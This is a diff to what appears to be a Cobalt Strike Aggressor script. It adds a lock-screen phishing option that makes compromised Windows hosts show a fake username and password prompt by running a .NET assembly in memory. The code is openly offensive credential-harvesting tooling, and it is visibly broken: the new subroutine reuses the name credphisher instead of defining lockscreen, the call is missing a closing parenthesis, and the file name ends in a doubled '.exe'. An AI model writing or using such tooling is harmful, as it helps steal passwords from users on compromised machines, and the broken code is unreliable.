@@ -76,6 +76,15 @@ menu "Phishing Users"
 					credphisher($bid);
 				}
 			}
+			
+########Run Lock Screen Phishing Exploit##################
+					
+		item "Prompt for Username and Password"{
+			local('$bid');
+				foreach $bid ($1){
+					lockscreen($bid);
+				}
+			}
 }
 
 menu "Domain Computer Object Enumeration"
@@ -188,5 +197,11 @@ bexecute_assembly($1, script_resource('/exe/SharpView.exe'), 'Get-NetGroup -Iden
 sub credphisher{
 
 bexecute_assembly($1, script_resource('/exe/CredPhisher.exe'), 'Please_Enter_Your_Password');
+
+}
+
+sub credphisher{
+
+bexecute_assembly($1, script_resource('/exe/WindowsFormApp9.exe.exe');
 
 }
